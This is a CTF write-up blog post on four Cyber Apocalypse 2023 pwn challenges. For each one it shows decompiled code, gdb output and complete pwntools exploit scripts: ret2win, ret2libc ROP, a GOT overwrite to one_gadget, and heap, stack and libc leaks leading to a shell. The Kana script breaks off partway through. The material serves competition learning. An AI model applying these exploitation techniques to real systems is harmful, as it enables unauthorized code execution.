# Cyber Apocalypse 2023: Pwn

> **Source:** Originally published at https://chovid99.github.io/posts/cyber-apocalypse-2023-pwn
> **Author:** Original author (personal blog / CTF team archive)
> **Retrieved:** 2026-07-13
> **Word count:** 26191
> **Images:** 8 embedded locally

---

Cyber Apocalypse 2023: Pwn - Chovid99's Blog


        **


## Contents


# Cyber Apocalypse 2023: Pwn


            * Mar 23, 2023 * 20250 words 
                * 96 minutes 


                    Contents
                    *


-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
- ````
- ``
-
-
-
-
-
-
-
-
-
-
            Cyber Apocalypse 2023


For the past five days, I have been competing solo in the Cyber Apocalypse CTF 2023. During this time, I was able to solve **all of the pwn challenges and **10 out of the 11 crypto challenges. In this writeup, I will be sharing my solutions for some of the pwn challenges that I solved. If you’re interested in reading about the crypto challenges, check out my other post.
I was able to successfully clear all of the pwn challenges


# Pwn


## Labyrinth


            *Description*


            You find yourself trapped in a mysterious labyrinth, with only one chance to escape. Choose the correct door wisely, for the wrong choice could have deadly consequences.


### Initial Analysis


In this challenge, we were given a binary called `labyrinth`. Let’s start by analyzing the binary’s security measures using the `checksec` tool.


```
1
2
3
4
5

```


```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

```


The binary has full RELRO, which means that the Global Offset Table (GOT) is read-only and cannot be modified. This prevents attackers from overwriting function pointers in the GOT to redirect program execution flow.


There is no canary present, which means that there is no stack protection mechanism in place to detect stack-based buffer overflows.


NX (No-eXecute) is enabled, which means that the stack and heap are marked as non-executable, preventing attackers from executing shellcode in these areas.


The binary is not compiled with Position Independent Executable (PIE) enabled, which means that the binary address is constant and not randomized during runtime.


Now, let’s disassemble the binary and take a closer look.


**main


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54

```


```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[8]; // [rsp+0h] [rbp-30h] BYREF
  __int64 v5; // [rsp+8h] [rbp-28h]
  __int64 v6; // [rsp+10h] [rbp-20h]
  __int64 v7; // [rsp+18h] [rbp-18h]
  char *s; // [rsp+20h] [rbp-10h]
  unsigned __int64 i; // [rsp+28h] [rbp-8h]

  setup(argc, argv, envp);
  banner();
  *(_QWORD *)v4 = 0LL;
  v5 = 0LL;
  v6 = 0LL;
  v7 = 0LL;
  fwrite("\nSelect door: \n\n", 1uLL, 0x10uLL, _bss_start);
  for ( i = 1LL; i <= 0x64; ++i )
  {
    if ( i > 9 )
    {
      if ( i > 0x63 )
        fprintf(_bss_start, "Door: %d ", i);
      else
        fprintf(_bss_start, "Door: 0%d ", i);
    }
    else
    {
      fprintf(_bss_start, "Door: 00%d ", i);
    }
    if ( !(i % 0xA) && i )
      putchar(10);
  }
  fwrite("\n>> ", 1uLL, 4uLL, _bss_start);
  s = (char *)malloc(0x10uLL);
  fgets(s, 5, stdin);
  if ( !strncmp(s, "69", 2uLL) || !strncmp(s, "069", 3uLL) )
  {
    fwrite(
      "\n"
      "You are heading to open the door but you suddenly see something on the wall:\n"
      "\n"
      "\"Fly like a bird and be free!\"\n"
      "\n"
      "Would you like to change the door you chose?\n"
      "\n"
      ">> ",
      1uLL,
      0xA0uLL,
      _bss_start);
    fgets(v4, 68, stdin);
  }
  fprintf(_bss_start, "\n%s[-] YOU FAILED TO ESCAPE!\n\n", "\x1B[1;31m");
  return 0;
}

```


Above is the `main` function. If you take a closer look, you’ll notice a buffer overflow vulnerability in the `v4` variable when `fgets(v4, 68, stdin);` is called. Additionally, while disassembling the binary, I came across a useful function called `escape_plan`.


**escape_plan


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22

```


```
int escape_plan()
{
  char buf; // [rsp+Bh] [rbp-5h] BYREF
  int fd; // [rsp+Ch] [rbp-4h]

  putchar(10);
  fwrite(&unk_402018, 1uLL, 0x1F0uLL, _bss_start);
  fprintf(
    _bss_start,
    "\n%sCongratulations on escaping! Here is a sacred spell to help you continue your journey: %s\n",
    "\x1B[1;32m",
    "\x1B[0m");
  fd = open("./flag.txt", 0);
  if ( fd < 0 )
  {
    perror("\nError opening flag.txt, please contact an Administrator.\n\n");
    exit(1);
  }
  while ( read(fd, &buf, 1uLL) > 0 )
    fputc(buf, _bss_start);
  return close(fd);
}

```


The given code snippet shows that the `escape_plan` method will print the flag. Therefore, our objective is to manipulate the program’s execution flow in such a way that it calls the `escape_plan` method.


### Solution


This is a classic buffer overflow challenge. As we can see in the decompiled `main` function, the buffer `v4` position is in `rbp-30h`. Therefore, we need to send a payload that contains:


- `b'a'*0x30` (to fill the stack)

- `p64(exe.bss()+0x200)` (to overwrite the saved RBP with a valid address in the .bss section)

- `p64(escape_plan_addr)` (to overwrite the stored RIP with the `escape_plan` function address)


#### Full Script


Here is the script I used to solve the challenge:


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37

```


```
from pwn import *

exe = ELF("./labyrinth_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe
context.arch = 'amd64'
context.encoding = 'latin'
context.log_level = 'INFO'
warnings.simplefilter("ignore")

remote_url = "167.99.86.8"
remote_port = 32088
gdbscript = '''
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.PLT_DEBUG:
            # gdb.attach(r, gdbscript=gdbscript)
            pause()
    else:
        r = remote(remote_url, remote_port)

    return r

r = conn()

# I choose to jump not to the start of escape_plan, but directly to the line that open and print the flag.
win_addr = 0x00000000004012b0
r.sendline(b'69')
payload = b'a'*0x30 + p64(exe.bss()+0x200)+p64(win_addr)
r.sendline(payload)

r.interactive()

```


![https://i.imgur.com/TuovCly.png](images/img_1.svg)

>


**Flag: HTB{3sc4p3_fr0m_4b0v3}


## Pandora’s Box


            *Description*


            You stumbled upon one of Pandora’s mythical boxes. Would you be curious enough to open it and see what’s inside, or would you opt to give it to your team for analysis?


### Initial Analysis


We were given a binary called `pb`. Let’s start by analyzing the binary’s security measures using the `checksec` tool.


```
1
2
3
4
5

```


```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

```


The binary has the following security features:


- Full RELRO, preventing overwriting the GOT.

- No canary, indicating a lack of stack protection.

- NX enabled, preventing jumping to the stack due to its non-executable property.

- No PIE, which means the binary address is constant.


The binary disassembly can be seen below.


**main


```
1
2
3
4
5
6
7
8

```


```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setup(argc, argv, envp);
  cls();
  banner();
  box();
  return 0;
}

```


The functions `setup`, `cls`, and `banner` aren’t too important. Let’s focus on disassembling the `box` function.


**box


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51

```


```
size_t box()
{
  __int64 v0; // rdx
  __int64 v1; // rcx
  char s[8]; // [rsp+0h] [rbp-30h] BYREF
  __int64 v4; // [rsp+8h] [rbp-28h]
  __int64 v5; // [rsp+10h] [rbp-20h]
  __int64 v6; // [rsp+18h] [rbp-18h]
  __int64 num; // [rsp+28h] [rbp-8h]

  *(_QWORD *)s = 0LL;
  v4 = 0LL;
  v5 = 0LL;
  v6 = 0LL;
  fwrite(
    "This is one of Pandora's mythical boxes!\n"
    "\n"
    "Will you open it or Return it to the Library for analysis?\n"
    "\n"
    "1. Open.\n"
    "2. Return.\n"
    "\n"
    ">> ",
    1uLL,
    0x7EuLL,
    _bss_start);
  num = read_num(
          "This is one of Pandora's mythical boxes!\n"
          "\n"
          "Will you open it or Return it to the Library for analysis?\n"
          "\n"
          "1. Open.\n"
          "2. Return.\n"
          "\n"
          ">> ",
          1LL,
          v0,
          v1);
  if ( num != 2 )
  {
    fprintf(_bss_start, "%s\nWHAT HAVE YOU DONE?! WE ARE DOOMED!\n\n", "\x1B[1;31m");
    exit(1312);
  }
  fwrite("\nInsert location of the library: ", 1uLL, 0x21uLL, _bss_start);
  fgets(s, 256, stdin);
  return fwrite(
           "\nWe will deliver the mythical box to the Library for analysis, thank you!\n\n",
           1uLL,
           0x4BuLL,
           _bss_start);
}

```


The same buffer overflow vulnerability can be observed in this challenge as well, specifically in the line `fgets(s, 256, stdin)`. However, unlike the previous challenge, there doesn’t seem to be any concealed function that can print the flag.


### Solution


The solution for this challenge involves ROP (Return Oriented Programming). Typically, there are two steps required to achieve code execution for this type of challenge:


- Leaking a libc address

- Forging the code execution flow to obtain a shell.


Since the binary is not PIE, we do not need to leak a PIE address and can directly use the available PLT provided in the binary. Additionally, we can use some available gadgets to perform the classic ROP.


#### Full Script


Here’s my full script that uses ROP (Return Oriented Programming) to solve this challenge:


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52

```


```
from pwn import *

exe = ELF("./pb_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe
context.arch = 'amd64'
context.encoding = 'latin'
context.log_level = 'INFO'
warnings.simplefilter("ignore")

remote_url = "178.62.64.13"
remote_port = 32229
gdbscript = '''
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.PLT_DEBUG:
            # gdb.attach(r, gdbscript=gdbscript)
            pause()
    else:
        r = remote(remote_url, remote_port)

    return r

r = conn()

pop_rdi = 0x000000000040142b
pop_rsi_r15 = 0x0000000000401429
puts_plt = exe.plt['puts']
puts_got = exe.got['puts']

payload = b'a'*0x30 + p64(exe.bss()+0x200)
payload += p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(exe.symbols['box'])
r.sendline(b'2')
r.sendline(payload)
r.recvuntil(b'you!\n')
r.recvline()
leaked_puts = u64(r.recv(6).ljust(8, b'\x00'))
libc.address = leaked_puts - libc.symbols['puts']
log.info(f'libc base: {hex(libc.address)}')
bin_sh_string_addr = next(libc.search(b'/bin/sh'))

payload = b'a'*0x30 + p64(exe.bss()+0x200)
payload += p64(pop_rdi+0x1) + p64(pop_rdi) + p64(bin_sh_string_addr) + p64(libc.symbols['system'])
r.sendline(b'2')
r.sendline(payload)

r.interactive()

```


![https://i.imgur.com/zEJthfO.png](images/img_2.svg)

>


**Flag: HTB{r3turn_2_P4nd0r4?!}


## Void


            *Description*


            The room goes dark and all you can see is a damaged terminal. Hack into it to restore the power and find your way out.


### Initial Analysis


We were given a binary file. Let’s try to `checksec` it first


```
1
2
3
4

```


```
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

```


The binary has the following security features:


- Partial RELRO, indicating that we can overwrite the GOT.

- No canary, indicating a lack of stack protection.

- NX enabled, preventing jumping to the stack due to its non-executable property.

- No PIE, which means the binary address is constant.


Let’s try to disassemble it.


**main


```
1
2
3
4
5

```


```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  vuln(argc, argv, envp);
  return 0;
}

```


The `main` called the `vuln`. Let’s check the `vuln` method.


**vuln


```
1
2
3
4
5
6

```


```
ssize_t vuln()
{
  char buf[64]; // [rsp+0h] [rbp-40h] BYREF

  return read(0, buf, 0xC8uLL);
}

```


As you have noticed, there is another buffer overflow vulnerability in the `vuln` function. However, the binary seems to be very small. Let’s take a look at the available Global Offset Table (GOT) using gdb.


```
1
2
3

```


```
pwndbg> got
GOT protection: Partial RELRO | GOT functions: 1
[0x404018] read@GLIBC_2.2.5 -> 0x7ffff7ee1780 (read) ◂— mov eax, dword ptr fs:[0x18]

```


Okay, so the GOT only contains `read` function. Therefore, there isn’t any method like `puts` that we can use to leak a libc address to gain a shell. Given the limitations of this small binary, it is clear that we need to find another way to get a shell.


### Solution


With the aid of `ropr`, let’s identify the available gadgets in the binary.


```
1
2
3
4
5
6

```


```
ropr void -m 10
...
0x00401108: add [rbp-0x3d], ebx; nop [rax+rax]; ret;
...
0x004011b2: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;
...

```


Notice that the first gadget is called `add-what-where`, which is a useful gadget. If we’re able to set the contents of `rbp-0x3d` and `ebx`, we can write to any memory location by incrementing the value with `ebx`. With the second gadget, we can set the `rbp` and `rbx` values.


BSince the binary is No PIE, we can rewrite the `read` GOT entry with any libc function address that we want without needing a leak. We just need to calculate the difference between our target libc function address and the `read` address. What should we overwrite the `read` GOT with?


The answer is we can rewrite it with the address of `one_gadget`. Let’s check the `one_gadget` result on the given `libc`.


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15

```


```
one_gadget libc.so.6
0xc961a execve("/bin/sh", r12, r13)
constraints:
  [r12] == NULL || r12 == NULL
  [r13] == NULL || r13 == NULL

0xc961d execve("/bin/sh", r12, rdx)
constraints:
  [r12] == NULL || r12 == NULL
  [rdx] == NULL || rdx == NULL

0xc9620 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL

```


Notice that the first `one_gadget` can be used because we have the gadget to set the `r12` and `r13` values as well. To summarize the steps needed to exploit this binary:


- Exploit the buffer overflow vulnerability to redirect the execution flow and overwrite the `read` GOT entry with the address of `one_gadget`

- Call `read` again, which will trigger the `one_gadget` and spawn a shell.


#### Full Script


Here’s my full script to solve this challenge:


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46

```


```
from pwn import *

exe = ELF("./void_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.arch = 'amd64'
context.encoding = 'latin'
context.log_level = 'INFO'
warnings.simplefilter("ignore")

remote_url = "209.97.134.50"
remote_port = 30893
gdbscript = '''
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.PLT_DEBUG:
            # gdb.attach(r, gdbscript=gdbscript)
            pause()
    else:
        r = remote(remote_url, remote_port)

    return r

r = conn()

pop_rdi = 0x00000000004011bb
pop_rsi_r15 = 0x00000000004011b9
add_what_where = 0x0000000000401108
pop_rbx_rbp_r12_r13_r14_r15 = 0x004011b2
ret_address = pop_rdi+1

read_plt = exe.plt['read']
read_got = exe.got['read']

# Load stage 2 rop
payload = b'a'*0x48
payload += p64(pop_rbx_rbp_r12_r13_r14_r15) + p64(0xfffdce9a) + p64(read_got+0x3d) + p64(0)*4
payload += p64(add_what_where)
payload += p64(read_plt)
r.sendline(payload)
r.interactive()

```


![https://i.imgur.com/caPI0gM.png](images/img_3.svg)

>


**Flag: HTB{r3s0lv3_th3_d4rkn355}


## Kana


            *Description*


            To facilitate communication between certain civilizations, a converter was developed. But can this converter be trusted to keep their messages secure?


### Initial Analysis


In this challenge, we are given a binary file. Let’s use the `checksec` tool to check its security features.


```
1
2
3
4

```


```
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled

```


All protections are on except there isn’t canary set in the stack.


Let’s try to disassemble the binary one by one.


**main


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34

```


```
void __fastcall __noreturn main(int a1, char **a2, char **a3)
{
  int v3; // ebx
  char v4[80]; // [rsp+10h] [rbp-B0h] BYREF
  char v5[96]; // [rsp+60h] [rbp-60h] BYREF

  sub_270A(v4, a2, a3);
  sub_75DD();
  while ( 1 )
  {
    sub_6E56(v5, v4);
    v3 = sub_7642(v5);
    sub_6DFC(v5);
    switch ( v3 )
    {
      case 1:
        sub_39FC(v4);
        break;
      case 2:
        sub_3DF8(v4);
        break;
      case 3:
        sub_41EE(v4);
        break;
      case 4:
        sub_46FA(v4);
        break;
      case 5:
        exit(0);
      default:
        continue;
    }
  }
}

```


Since this binary has been stripped, it’s difficult to see what’s going on just by disassembling it. Let’s run it to get a better idea.


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17

```


```
------------------------------------------
[文] :
 1 - kata-fy
 2 - hira-fy
 3 - alpha-fy
 4 - new kana
 5 - exit
>> 4
>> aaaa
------------------------------------------
[文] : aaaa
 1 - kata-fy
 2 - hira-fy
 3 - alpha-fy
 4 - new kana
 5 - exit
>>

```


It turns out that this binary has five menus, and the fourth menu can be used to generate a new `kana` that is printed each time the binary displays a menu. I spent a lot of time on this challenge trying to find the bug, but it turns out that the first, second, and third menus are actually just a distraction.


The bug is in the sub_7642 (print menu) function itself, particularly when reading the user’s chosen option. Below is the disassembly of the sub_7642 function.


**sub_7642


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45

```


```
int __fastcall sub_7642(__int64 a1)
{
  __int64 v1; // rax
  __int64 v2; // rbx
  __int64 v3; // rax
  __int64 v4; // rax
  __int64 v5; // rax
  __int64 v6; // rax
  __int64 v7; // rax
  __int64 v8; // rax
  __int64 s[6]; // [rsp+10h] [rbp-70h] BYREF
  char v11[44]; // [rsp+40h] [rbp-40h] BYREF
  int v12; // [rsp+6Ch] [rbp-14h]

  memset(s, 0, sizeof(s));
  v12 = 0;
  v1 = std::operator<<<std::char_traits<char>>(&std::cout, "------------------------------------------");
  std::ostream::operator<<(v1, &std::endl<char,std::char_traits<char>>);
  v2 = std::operator<<<std::char_traits<char>>(&std::cout, &unk_819B);
  sub_476E(v11, a1);
  v3 = std::operator<<<char>(v2, v11);
  std::ostream::operator<<(v3, &std::endl<char,std::char_traits<char>>);
  std::string::~string(v11);
  v4 = std::operator<<<std::char_traits<char>>(&std::cout, " 1 - kata-fy");
  std::ostream::operator<<(v4, &std::endl<char,std::char_traits<char>>);
  v5 = std::operator<<<std::char_traits<char>>(&std::cout, " 2 - hira-fy");
  std::ostream::operator<<(v5, &std::endl<char,std::char_traits<char>>);
  v6 = std::operator<<<std::char_traits<char>>(&std::cout, " 3 - alpha-fy");
  std::ostream::operator<<(v6, &std::endl<char,std::char_traits<char>>);
  v7 = std::operator<<<std::char_traits<char>>(&std::cout, " 4 - new kana");
  std::ostream::operator<<(v7, &std::endl<char,std::char_traits<char>>);
  v8 = std::operator<<<std::char_traits<char>>(&std::cout, " 5 - exit");
  std::ostream::operator<<(v8, &std::endl<char,std::char_traits<char>>);
  std::operator<<<std::char_traits<char>>(&std::cout, ">> ");
  memset(s, 0, sizeof(s));
  while ( 1 )
  {
    read(0, (char *)s + v12, 1uLL);
    if ( *((_BYTE *)s + v12) == 10 )
      break;
    ++v12;
  }
  *((_BYTE *)s + v12) = 0;
  return atoi((const char *)s);
}

```


`s` is the array that will be used to store our chosen option. However, notice that the size of `s` is only `6`, yet the reading logic is as follows:


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14

```


```
  __int64 s[6]; // [rsp+10h] [rbp-70h] BYREF
  char v11[44]; // [rsp+40h] [rbp-40h] BYREF
  int v12; // [rsp+6Ch] [rbp-14h]
  ...
  memset(s, 0, sizeof(s));
  while ( 1 )
  {
    read(0, (char *)s + v12, 1uLL);
    if ( *((_BYTE *)s + v12) == 10 )
      break;
    ++v12;
  }
  *((_BYTE *)s + v12) = 0;
  return atoi((const char *)s);

```


The `read` function is reading our input one character at a time, and it will stop only if the input character is `\n`. Each time it reads a byte, it will increment the `v12` counter, which is stored in the stack. However, the size of `s` is only `6`, which means this is a buffer overflow bug. With this vulnerability, we need to try to get a shell.


### Solution


The issue with the binary is that it’s PIE-enabled, which means that without a leak of either the PIE base or libc, it’s not possible to use the buffer overflow bug to gain a shell. Normally, we’d need to overwrite the saved RIP, but we don’t know what address to write to because we don’t know the base address.


However, the setup of this challenge is unique. The `v12` variable, which is the counter used as the offset of the current read, is located below the `s` position in the stack. This means that the buffer overflow can also overwrite `v12` with a large value, allowing us to skip some bytes and jump directly to the desired location. Using this bug, we can perform the buffer overflow without overwriting the saved RIP in the stack. The question now is whether there’s a good target in the stack that resides below the saved RIP.


Fortunately, there is a suitable target in the stack below the saved RIP that we can use to leak a value. While debugging with gdb, I noticed that using the `fourth` menu to generate a new kana (a string that is always printed when the menu is printed) performs the following steps:


- Allocating the string to a heap chunk

- Put the heap chunk address at the stack


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23

```


```
pwndbg> tele 30
00:0000│ rsp   0x7fffffffdad0 ◂— 0x21 /* '!' */
01:0008│       0x7fffffffdad8 —▸ 0x7fffffffdbc0 —▸ 0x7ffff7d44ce0 (main_arena+96) —▸ 0x5555555785b0 ◂— 0x0
02:0010│ rcx-2 0x7fffffffdae0 ◂— 0x3031 /* '10' */
03:0018│       0x7fffffffdae8 ◂— 0x0
04:0020│       0x7fffffffdaf0 ◂— 0x0
05:0028│       0x7fffffffdaf8 ◂— 0x0
06:0030│       0x7fffffffdb00 ◂— 0x0
07:0038│       0x7fffffffdb08 ◂— 0x0
08:0040│       0x7fffffffdb10 —▸ 0x555555578590 ◂— 0x555555578
09:0048│       0x7fffffffdb18 ◂— 0x20 /* ' ' */
0a:0050│       0x7fffffffdb20 ◂— 0x20 /* ' ' */
0b:0058│       0x7fffffffdb28 —▸ 0x55555555ae99 ◂— jmp 0x55555555aeb9
0c:0060│       0x7fffffffdb30 —▸ 0x7fffffffdb70 ◂— 0x0
0d:0068│       0x7fffffffdb38 ◂— 0x2ffffdbc0
0e:0070│       0x7fffffffdb40 —▸ 0x55555555fc20 —▸ 0x5555555566c0 ◂— endbr64
0f:0078│       0x7fffffffdb48 ◂— 0x4
10:0080│ rbp   0x7fffffffdb50 —▸ 0x7fffffffdc20 ◂— 0x1
11:0088│       0x7fffffffdb58 —▸ 0x55555555ac74 ◂— mov ebx, eax
12:0090│       ...
19:00c8│       0x7fffffffdb98 ◂— 0x57 /* 'W' */
1a:00d0│       0x7fffffffdba0 —▸ 0x555555576d50 ◂— 'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb'
1b:00d8│       0x7fffffffdba8 ◂— 0x20 /* ' ' */

```


At this point, I realized that we could leverage this behavior to obtain a leak by overwriting the stack location containing our `kana` address with the address of our target. Using the buffer overflow bug, we could first attempt to leak the `heap` address.


#### Leaking heap address


With the buffer overflow bug, we can overwrite the last byte of the `kana` address to null. As we can see from the examination via GDB below, if we overwrite the last byte of `kana` with null, we will be able to get a leak of the heap address.


```
1
2
3
4
5
6

```


```
pwndbg> x/10gx 0x555555576d00
0x555555576d00:	0x0000555000000001	0x0000555555576bc0
0x555555576d10:	0x0000555555577a20	0x0000555555576c10
0x555555576d20:	0x0000000000e38391	0x0000555555576d38
0x555555576d30:	0x0000000000000002	0x0000000000006170
0x555555576d40:	0x0000000000000000	0x0000000000000051

```


Below is a script snippet that demonstrates how to obtain a leak of the heap address using the buffer overflow vulnerability:


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48

```


```
from pwn import *

exe = ELF("./kana_patched")
libc = ELF("./libc-2.35.so")
ld = ELF("./ld-2.35.so")

context.binary = exe
context.arch = 'amd64'
context.encoding = 'latin'
context.log_level = 'INFO'
warnings.simplefilter("ignore")

remote_url = "144.126.196.198"
remote_port = 31803
gdbscript = '''
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.PLT_DEBUG:
            # gdb.attach(r, gdbscript=gdbscript)
            pause()
    else:
        r = remote(remote_url, remote_port)

    return r

r = conn()
r.sendlineafter(b'>> ', b'4')
r.sendlineafter(b'>> ', b'b'*0x20)

# Leak heap
# The a*'0x5c' and '\xaf' is a crafted payload that we can use
# to skip the option read by 0xaf bytes, so that we can leap over
# the saved RIP during triggering the buffer overflow bug.
#
# Basically, withh the BOF, we overwrite the v12 value to 0xaf, so that the next
# write after overwriting the v12 will skip some addressed and jump directly to aaddress
# below the saved RIP address.
r.sendlineafter(b'>> ', b'a'*0x5c+b'\xaf'*1 + b'c'*0x10)
r.recvuntil(b' : ')
out = r.recvline()
leaked_heap = u64(out[8:16])
log.info(f'leaked_heap = {hex(leaked_heap)}')
good_heap_offset = -0x23e8 # Contains stack address
target_heap = leaked_heap+good_heap_offset
log.info(f'target_heap = {hex(target_heap)}')

```


#### Leaking stack address


After observing via GDB, I noticed that the address `leaked_heap - 0x23e8` contains a stack address.


```
1
2
3
4
5
6

```


```
pwndbg> x/10gx 0x555555575368
0x555555575368:	0x00007fffffffdb78	0x00005555555750e0
0x555555575378:	0x0000555555575ea0	0x0000000000e382b0
0x555555575388:	0x0000555555575398	0x0000000000000002
0x555555575398:	0x0000000000007567	0x0000000000000000
0x5555555753a8:	0x0000000000000051	0x0000000000000001

```


By overwriting the stack address that contains `kana` to this heap chunk address, we can obtain a leak of the stack. Here’s a partial script that demonstrates this technique:


```
1
2
3
4
5
6
7
8

```


```
# Leak stack
r.sendlineafter(b'>> ', b'a'*0x5c+b'\xaf'*1 + b'c'*0x10+p64(target_heap)+p64(0x20))
r.recvuntil(b': ')
out = r.recvline()
leaked_stack = u64(out[:6].ljust(8, b'\x00'))
log.info(f'leaked_stack = {hex(leaked_stack)}')
good_stack_offset = 0xb0 # Contains libc address
target_stack = leaked_stack+good_stack_offset

```


#### Leaking libc address and pie address


Once we obtained the leaked stack address, it became straightforward to get the PIE and libc addresses. There were many stack addresses that contained the information we needed. During debugging with gdb, I noticed that the address `leaked_stack+0xb0` held a libc address, and the address `leaked_stack-0x20` contained a PIE address. To retrieve the leaks, we repeated the previous step of overwriting the stack address with the corresponding good addresses.


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17

```


```
# Leak libc
r.sendlineafter(b'>> ', b'a'*0x5c+b'\xaf'*1 + b'c'*0x10+p64(target_stack)+p64(0x20))
r.recvuntil(b': ')
out = r.recvline()
leaked_libc = u64(out[:6].ljust(8, b'\x00'))
libc.address = leaked_libc - 0x29d90
log.info(f'leaked_libc = {hex(leaked_libc)}')
log.info(f'libc_base = {hex(libc.address)}')

# Leak PIE
target_stack = leaked_stack-0x20
r.sendlineafter(b'>> ', b'a'*0x5c+b'\xaf'*1 + b'c'*0x10+p64(target_stack)+p64(0x20))
r.recvuntil(b': ')
out = r.recvline()
leaked_pie = u64(out[:6].ljust(8, b'\x00'))
pie_base = leaked_pie - 0x6c68
log.info(f'pie_base = {hex(pie_base)}')

```


#### Gain Remote Code Execution


With the leak of libc, pie, and stack addresses, we can now proceed with classic ROP exploitation. I opted to use the `one_gadget` to obtain a shell. In the partial script below, I first constructed the ROP chain by finding gadgets in the binary that fulfill the `one_gadget` constraint. Once the chain is built, we simply need to return to the `one_gadget` to trigger it and obtain a shell.


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14

```


```
# ROP to one_gadget
log.info(f'Try to ROP...')
pop_rsi_rbp = pie_base +0x000000000000605f
pop_rdx = pie_base + 0x0000000000006022
one_gadget = libc.address + 0xebcf8 # rbp-0x48 writable, rbp-0x50 null, r12 null
rbp = leaked_stack

payload = b'a'*0x6b
payload += p64(rbp)
payload += p64(pop_rsi_rbp) + p64(0) + p64(rbp)
payload += p64(pop_rdx) + p64(0)
payload += p64(one_gadget)
r.sendlineafter(b'>> ', payload)
r.interactive()

```


#### Full script


The full script can be found below:


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83

```


```
from pwn import *

exe = ELF("./kana_patched")
libc = ELF("./libc-2.35.so")
ld = ELF("./ld-2.35.so")

context.binary = exe
context.arch = 'amd64'
context.encoding = 'latin'
context.log_level = 'INFO'
warnings.simplefilter("ignore")

remote_url = "167.99.86.8"
remote_port = 32728
gdbscript = '''
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.PLT_DEBUG:
            # gdb.attach(r, gdbscript=gdbscript)
            pause()
    else:
        r = remote(remote_url, remote_port)

    return r

r = conn()
r.sendlineafter(b'>> ', b'4')
r.sendlineafter(b'>> ', b'b'*0x20)

# Leak heap
r.sendlineafter(b'>> ', b'a'*0x5c+b'\xaf'*1 + b'c'*0x10)
r.recvuntil(b' : ')
out = r.recvline()
leaked_heap = u64(out[8:16])
log.info(f'leaked_heap = {hex(leaked_heap)}')
good_heap_offset = -0x23e8 # Contains stack address
target_heap = leaked_heap+good_heap_offset
log.info(f'target_heap = {hex(target_heap)}')

# Leak stack
r.sendlineafter(b'>> ', b'a'*0x5c+b'\xaf'*1 + b'c'*0x10+p64(target_heap)+p64(0x20))
r.recvuntil(b': ')
out = r.recvline()
leaked_stack = u64(out[:6].ljust(8, b'\x00'))
log.info(f'leaked_stack = {hex(leaked_stack)}')
good_stack_offset = 0xb0 # Contains libc address
target_stack = leaked_stack+good_stack_offset

# Leak libc
